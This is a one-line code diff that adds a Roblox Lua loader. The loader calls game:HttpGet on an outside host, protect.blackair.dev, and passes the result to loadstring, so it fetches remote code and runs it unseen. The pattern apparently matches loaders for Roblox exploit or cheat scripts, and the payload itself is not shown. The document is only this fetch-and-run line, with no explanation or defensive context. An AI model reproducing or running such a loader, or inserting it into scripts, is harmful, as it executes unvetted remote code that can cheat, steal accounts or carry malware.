@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://protect.blackair.dev/api/v1/load/f7010006-cdb5-4513-ac7d-9787f0657f6d"))()
